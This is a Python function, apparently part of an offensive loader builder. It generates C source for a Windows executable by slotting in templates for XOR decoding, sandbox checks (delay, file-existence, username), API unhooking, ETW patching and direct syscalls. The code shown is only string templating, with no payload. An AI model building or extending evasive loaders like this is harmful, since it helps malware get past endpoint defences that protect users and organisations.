def generate_exe_source(syscall_file, xor_template, domath_template, domath_function, file_exist_template, file_exist_function, username_template, username_function, etw_template, etw_function, unhook_template, unhook_function, executable_template, executable_function):

    exe_template = """
#include "REPLACE_WITH_SYSCALL_FILE.h"
#include "Shlwapi.h"

//REPLACE_WITH_XOR_TEMPLATE


//REPLACE_WITH_DOMATH_TEMPLATE


//REPLACE_WITH_FILE_EXIST_TEMPLATE


//REPLACE_WITH_USERNAME_TEMPLATE


//REPLACE_WITH_UNHOOK_TEMPLATE


//REPLACE_WITH_ETW_TEMPLATE


//REPLACE_WITH_EXE_TEMPLATE


int main() {

    //REPLACE_WITH_DOMATH_FUNCTION_NAME();
    //REPLACE_WITH_FILE_EXIST_FUNCTION_NAME();
    //REPLACE_WITH_USERNAME_FUNCTION_NAME();
    //REPLACE_WITH_UNHOOK_FUNCTION_NAME();
    //REPLACE_WITH_ETW_FUNCTION_NAME();
    REPLACE_WITH_EXE_FUNCTION_NAME();
    
}

"""

    exe_template = exe_template.replace("//REPLACE_WITH_XOR_TEMPLATE", xor_template)
    exe_template = exe_template.replace("//REPLACE_WITH_DOMATH_TEMPLATE", domath_template)
    exe_template = exe_template.replace("//REPLACE_WITH_FILE_EXIST_TEMPLATE", file_exist_template)
    exe_template = exe_template.replace("//REPLACE_WITH_USERNAME_TEMPLATE", username_template)
    exe_template = exe_template.replace("//REPLACE_WITH_UNHOOK_TEMPLATE", unhook_template)
    exe_template = exe_template.replace("//REPLACE_WITH_ETW_TEMPLATE", etw_template)
    exe_template = exe_template.replace("//REPLACE_WITH_EXE_TEMPLATE", executable_template)

    exe_template = exe_template.replace("REPLACE_WITH_SYSCALL_FILE", syscall_file)

    if domath_function != "":
        exe_template = exe_template.replace("//REPLACE_WITH_DOMATH_FUNCTION_NAME", domath_function)
    if file_exist_function != "":
        exe_template = exe_template.replace("//REPLACE_WITH_FILE_EXIST_FUNCTION_NAME", file_exist_function)
    if username_function != "":
        exe_template = exe_template.replace("//REPLACE_WITH_USERNAME_FUNCTION_NAME", username_function)
    if unhook_function != "":
        exe_template = exe_template.replace("//REPLACE_WITH_UNHOOK_FUNCTION_NAME", unhook_function)
    if etw_function != "":
        exe_template = exe_template.replace("//REPLACE_WITH_ETW_FUNCTION_NAME", etw_function)
    if executable_function != "":
        exe_template = exe_template.replace("REPLACE_WITH_EXE_FUNCTION_NAME", executable_function)

    return exe_template
